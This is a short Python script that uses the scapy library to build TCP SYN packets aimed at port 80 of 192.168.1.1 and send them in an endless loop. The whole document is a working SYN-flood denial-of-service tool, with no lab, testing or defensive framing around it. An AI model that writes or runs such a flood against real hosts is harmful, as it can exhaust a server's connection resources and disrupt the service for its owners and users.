from scapy.all import *

p = IP(dst="192.168.1.1") / TCP(dport=80, flags="S")
send(p, loop=1)